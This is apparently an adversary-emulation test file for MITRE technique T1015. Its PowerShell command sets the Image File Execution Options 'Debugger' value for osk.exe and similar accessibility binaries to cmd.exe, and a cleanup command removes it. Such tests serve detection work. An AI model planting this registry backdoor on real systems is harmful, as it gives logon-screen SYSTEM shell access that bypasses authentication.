---
attack_technique: T1015
display_name: Accessibility Features

atomic_tests:
- name: Attaches Command Prompt As Debugger To a Hashtable of target processes
  description: |
    This allows adversaries to execute the attached process
    Attaches cmd.exe to osk.exe by default. Other useful values to include in parent_list include: "sethc.exe", "utilman.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe", "atbroker.exe".
        Invoke-AtomicTest T1015 -InputArgs $myArgs

  supported_platforms:
    - windows
  input_arguments:
    parent_list:
      description: Comma seperated list of files you want to Attach #{attached_process} to. Default- "osk.exe"
      type: String
      default: "osk.exe"
    attached_process:
      description: Full path to process to attach to target in #{parent_list}. Default- cmd.exe
      type: Path
      default: C:\windows\system32\cmd.exe

  executor:
    name: powershell
    elevation_required: true
    command: |
      $input_table = #{parent_list}
      Foreach ($item in $input_table){   
        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
        $Value = "#{attached_process}"
        $Name = "Debugger"
        IF(!(Test-Path $registryPath))
        {
          New-Item -Path $registryPath -Force
          New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
        }
        ELSE
        {
          New-ItemProperty -Path $registryPath -Name $name -Value $Value
        }
      }
    cleanup_command: |
      $input_table = #{parent_list}  
      Foreach ($item in $input_table){
        reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f
      }
